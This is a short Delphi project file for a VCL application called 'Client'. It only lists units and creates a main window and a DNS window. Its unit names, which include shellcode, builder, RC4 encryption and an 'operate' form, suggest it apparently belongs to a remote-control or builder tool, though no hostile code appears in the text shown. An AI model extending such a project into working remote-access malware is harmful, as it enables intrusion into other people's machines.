program Client;

uses
  Vcl.Forms,
  FormMain in 'FormMain.pas' {MainForm},
  UnitClientContext in 'UnitClientContext.pas',
  UnitGlobal in 'UnitGlobal.pas',
  UnitRC4 in 'UnitRC4.pas',
  UnitCompress in 'UnitCompress.pas',
  SimpleMsgPack in 'SimpleMsgPack.pas',
  UnitShellCodes in 'UnitShellCodes.pas',
  UnitCountryInfo in 'UnitCountryInfo.pas',
  UnitCommon in 'UnitCommon.pas',
  UnitFormDns in 'UnitFormDns.pas' {DnsForm},
  UnitBuilder in 'UnitBuilder.pas',
  FormOperate in 'FormOperate.pas' {OperateForm};

{$R *.res}

begin
  Application.Initialize;
  Application.MainFormOnTaskbar := True;
  Application.CreateForm(TMainForm, MainForm);
  Application.CreateForm(TDnsForm, DnsForm);
  Application.Run;
end.
